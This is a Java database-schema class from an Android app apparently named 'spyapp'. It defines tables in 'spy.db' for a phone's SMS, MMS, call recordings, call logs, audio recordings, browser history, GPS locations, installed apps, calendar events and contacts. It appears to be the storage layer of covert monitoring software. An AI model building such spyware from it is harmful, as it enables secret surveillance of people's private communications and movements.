package com.app.spyapp.database;

public class DBUtils {

    /**
     * Integer Constants
     */
    public static final int DATABASE_VERSION = 3;

    /**
     * Database Name
     */
    public static final String DATABASE_NAME = "spy.db";

    /**
     * Tables Constant Names
     */
    public static final String SMS_TABLE = "sms";
    public static final String MMS_TABLE = "mms";
    public static final String CALL_RECORD_TABLE = "call_record";
    public static final String CALLLOG_TABLE = "calllog";
    public static final String AUDIORECORD_TABLE = "audiorecord";
    public static final String HISTORY_TABLE = "history";
    public static final String BOOKMARK_TABLE = "bookmark";
    public static final String LOCATION_TABLE = "location";
    public static final String INSTALL_APP_TABLE = "installapp";
    public static final String EVENT_TABLE = "event";
    public static final String CONTACT_TABLE = "contact";
//


    /**
     * Columns Names
     */
    // SMS
    public static final String COLUMN_SMS_ID = "sms_id";
    public static final String COLUMN_SMS_PHONE = "phone";
    public static final String COLUMN_SMS_BODY = "body";
    public static final String COLUMN_SMS_MSGTYPE = "msgtype";
    public static final String COLUMN_SMS_DATE = "date";
    public static final String COLUMN_SMS_UPDATEDDATE = "updated_date";

    //MMS
    public static final String COLUMN_MMS_ID = "mms_id";
    public static final String COLUMN_MMS_PHONE = "phone";
    public static final String COLUMN_MMS_BODY = "body";
    public static final String COLUMN_MMS_FILEPATH = "filepath";
    public static final String COLUMN_MMS_MSGTYPE = "msgtype";
    public static final String COLUMN_MMS_DATE = "date";
    public static final String COLUMN_MMS_UPDATEDDATE = "updatedate";

    //Call Record
    public static final String COLUMN_CALL_RECORD_ID = "call_record_id";
    public static final String COLUMN_CALL_RECORD_INCOMING = "incoming_number";
    public static final String COLUMN_CALL_RECORD_OUTGOING = "outgoing_number";
    public static final String COLUMN_CALL_RECORD_DATE = "recorddate";
    public static final String COLUMN_CALL_RECORD_FILENAME = "filename";
    public static final String COLUMN_CALL_RECORD_FILEPATH = "filepath";
    public static final String COLUMN_CALL_RECORD_UPDATEDDATE = "updatedate";

    //Call Logs
    public static final String COLUMN_CALL_LOG_ID = "alertid";
    public static final String COLUMN_CALL_LOG_USERNAME = "username";
    public static final String COLUMN_CALL_LOG_PHONENUMBER = "phone";
    public static final String COLUMN_CALL_LOG_CALLDATE = "calldate";
    public static final String COLUMN_CALL_LOG_DURATION = "duration";
    public static final String COLUMN_CALL_LOG_DIR = "dir";
    public static final String COLUMN_CALL_LOG_DIRCODE = "dircode";
    public static final String COLUMN_CALL_LOG_CALLTYPE = "calltype";
    public static final String COLUMN_CALL_LOG_UPDATEDDATE = "updatedate";


    //Audio Record
    public static final String COLUMN_AUDIO_RECORD_ID = "recordid";
    public static final String COLUMN_AUDIO_RECORD_FILENAME = "filename";
    public static final String COLUMN_AUDIO_RECORD_FILEPATH = "filepath";
    public static final String COLUMN_AUDIO_RECORD_DATE = "recorddate";
    public static final String COLUMN_AUDIO_RECORD_UPDATEDDATE = "updatedate";

    //History Record
    public static final String COLUMN_HISTORY_ID = "historyid";
    public static final String COLUMN_HISTORY_TITLE = "title";
    public static final String COLUMN_HISTORY_URL = "url";
    public static final String COLUMN_HISTORY_TYPE = "type";
    public static final String COLUMN_HISTORY_DATETIME = "hdatetime";
    public static final String COLUMN_HISTORY_UPDATEDDATE = "updatedate";

    //History Record
    public static final String COLUMN_BOOKMARK_ID = "historyid";
    public static final String COLUMN_BOOKMARK_TITLE = "title";
    public static final String COLUMN_BOOKMARK_URL = "url";
    public static final String COLUMN_BOOKMARK_TYPE = "type";
    public static final String COLUMN_BOOKMARK_DATETIME = "hdatetime";
    public static final String COLUMN_BOOKMARK_UPDATEDDATE = "updatedate";

    //Location
    public static final String COLUMN_LOCATION_ID = "locationid";
    public static final String COLUMN_LOCATION_LAT = "lat";
    public static final String COLUMN_LOCATION_LANG = "lang";
    public static final String COLUMN_LOCATION_DATETIME = "datetime";
    public static final String COLUMN_LOCATION_UPDATEDDATE = "updatedate";

    //INSTALL APP
    public static final String COLUMN_INSTALL_APP_ID = "appid";
    public static final String COLUMN_INSTALL_APP_NAME = "appname";
    public static final String COLUMN_INSTALL_APP_PACKAGENAME = "packagename";
    public static final String COLUMN_INSTALL_APP_VERSIONNAME = "versionname";
    public static final String COLUMN_INSTALL_APP_VERSIONCODE = "versioncode";
    public static final String COLUMN_INSTALL_APP_SOURCEDIR = "srcdir";
    public static final String COLUMN_INSTALL_APP_UPDATEDDATE = "updatedate";


    //EVENT DETAIL
    public static final String COLUMN_EVENT_ID = "eventid";
    public static final String COLUMN_EVENT_TITLE = "eventtitle";
    public static final String COLUMN_EVENT_DESC = "eventdesc";
    public static final String COLUMN_EVENT_STARTDATE = "eventstartdate";
    public static final String COLUMN_EVENT_ENDDATE = "eventenddate";
    public static final String COLUMN_EVENT_LOCATION = "eventlocation";
    public static final String COLUMN_EVENT_UPDATEDDATE = "updateddate";

    //Contact
    public static final String COLUMN_CONATCT_ID = "contactid";
    public static final String COLUMN_CONATCT_NAME = "contactname";
    public static final String COLUMN_CONATCT_PHONENUMBER = "phonenumber";
    public static final String COLUMN_CONATCT_UPDATED = "updateddate";

    //    /**

    //SMS TABLE
    static final String DB_CREATE_SMS_TABLE = "CREATE TABLE IF NOT EXISTS " + SMS_TABLE + " (" + COLUMN_SMS_ID + " INTEGER, " + COLUMN_SMS_PHONE
            + " TEXT," + COLUMN_SMS_BODY + " TEXT," + COLUMN_SMS_DATE + " TEXT, " + COLUMN_SMS_MSGTYPE + " TEXT," + COLUMN_SMS_UPDATEDDATE + " TEXT)";
    //MMS TABLE
    static final String DB_CREATE_MMS_TABLE = "CREATE TABLE IF NOT EXISTS " + MMS_TABLE + " (" + COLUMN_MMS_ID + " INTEGER, " + COLUMN_MMS_PHONE
            + " TEXT," + COLUMN_MMS_BODY + " TEXT," + COLUMN_MMS_FILEPATH + " TEXT," + COLUMN_MMS_MSGTYPE + " TEXT," + COLUMN_MMS_DATE + " TEXT," + COLUMN_MMS_UPDATEDDATE + " TEXT,PRIMARY KEY (" + COLUMN_MMS_ID + "))";

    //CALL RECORD
    static final String DB_CREATE_CALLRECORD_TABLE = "CREATE TABLE IF NOT EXISTS " + CALL_RECORD_TABLE + " (" + COLUMN_CALL_RECORD_ID + " INTEGER, " + COLUMN_CALL_RECORD_INCOMING
            + " TEXT," + COLUMN_CALL_RECORD_OUTGOING + " TEXT," + COLUMN_CALL_RECORD_DATE + " TEXT," + COLUMN_CALL_RECORD_FILENAME + " TEXT," + COLUMN_CALL_RECORD_FILEPATH + " TEXT," + COLUMN_CALL_RECORD_UPDATEDDATE + " TEXT,PRIMARY KEY (" + COLUMN_CALL_RECORD_ID + "))";


    static final String DB_CREATE_CALLLOG_TABLE = "CREATE TABLE IF NOT EXISTS " + CALLLOG_TABLE + " (" + COLUMN_CALL_LOG_ID + " INTEGER, " + COLUMN_CALL_LOG_USERNAME
            + " TEXT," + COLUMN_CALL_LOG_PHONENUMBER + " TEXT," + COLUMN_CALL_LOG_CALLDATE + " TEXT," + COLUMN_CALL_LOG_DURATION + " TEXT," + COLUMN_CALL_LOG_DIR + " TEXT," + COLUMN_CALL_LOG_DIRCODE + " TEXT," + COLUMN_CALL_LOG_CALLTYPE + " TEXT," + COLUMN_CALL_LOG_UPDATEDDATE + " TEXT)";


    static final String DB_CREATE_AUDIO_RECORD_TABLE = "CREATE TABLE IF NOT EXISTS " + AUDIORECORD_TABLE + " (" + COLUMN_AUDIO_RECORD_ID + " INTEGER, " + COLUMN_AUDIO_RECORD_FILENAME
            + " TEXT," + COLUMN_AUDIO_RECORD_FILEPATH + " TEXT," + COLUMN_AUDIO_RECORD_DATE + " TEXT," + COLUMN_AUDIO_RECORD_UPDATEDDATE + " TEXT,PRIMARY KEY (" + COLUMN_AUDIO_RECORD_ID + "))";

    static final String DB_CREATE_HISTORY_TABLE = "CREATE TABLE IF NOT EXISTS " + HISTORY_TABLE + " (" + COLUMN_HISTORY_ID + " INTEGER, " + COLUMN_HISTORY_TITLE
            + " TEXT," + COLUMN_HISTORY_URL + " TEXT," + COLUMN_HISTORY_TYPE + " TEXT," + COLUMN_HISTORY_DATETIME + " TEXT," + COLUMN_HISTORY_UPDATEDDATE + " TEXT,PRIMARY KEY (" + COLUMN_HISTORY_ID + "))";

    static final String DB_CREATE_BOOKMARK_TABLE = "CREATE TABLE IF NOT EXISTS " + BOOKMARK_TABLE + " (" + COLUMN_BOOKMARK_ID + " INTEGER, " + COLUMN_BOOKMARK_TITLE
            + " TEXT," + COLUMN_BOOKMARK_URL + " TEXT," + COLUMN_BOOKMARK_TYPE + " TEXT," + COLUMN_BOOKMARK_DATETIME + " TEXT," + COLUMN_BOOKMARK_UPDATEDDATE + " TEXT)";


    static final String DB_CREATE_LOCATION_TABLE = "CREATE TABLE IF NOT EXISTS " + LOCATION_TABLE + " (" + COLUMN_LOCATION_ID + " INTEGER, " + COLUMN_LOCATION_LAT
            + " TEXT," + COLUMN_LOCATION_LANG + " TEXT," + COLUMN_LOCATION_DATETIME + " TEXT," + COLUMN_LOCATION_UPDATEDDATE + " TEXT,PRIMARY KEY (" + COLUMN_LOCATION_ID + "))";

    static final String DB_CREATE_INSTALLAPP_TABLE = "CREATE TABLE IF NOT EXISTS " + INSTALL_APP_TABLE + " (" + COLUMN_INSTALL_APP_ID + " INTEGER, " + COLUMN_INSTALL_APP_NAME
            + " TEXT," + COLUMN_INSTALL_APP_PACKAGENAME + " TEXT," + COLUMN_INSTALL_APP_VERSIONNAME + " TEXT," + COLUMN_INSTALL_APP_VERSIONCODE + " TEXT," + COLUMN_INSTALL_APP_SOURCEDIR + " TEXT," + COLUMN_INSTALL_APP_UPDATEDDATE + " TEXT,PRIMARY KEY (" + COLUMN_INSTALL_APP_ID + "))";


    static final String DB_CREATE_EVENT_TABLE = "CREATE TABLE IF NOT EXISTS " + EVENT_TABLE + " (" + COLUMN_EVENT_ID + " INTEGER, " + COLUMN_EVENT_TITLE
            + " TEXT," + COLUMN_EVENT_DESC + " TEXT," + COLUMN_EVENT_STARTDATE + " TEXT," + COLUMN_EVENT_ENDDATE + " TEXT," + COLUMN_EVENT_LOCATION + " TEXT," + COLUMN_EVENT_UPDATEDDATE + " TEXT)";


    static final String DB_CREATE_CONTACT_TABLE = "CREATE TABLE IF NOT EXISTS " + CONTACT_TABLE + " (" + COLUMN_CONATCT_ID + " INTEGER, " + COLUMN_CONATCT_NAME
            + " TEXT," + COLUMN_CONATCT_PHONENUMBER + " TEXT," + COLUMN_CONATCT_UPDATED + " TEXT)";




}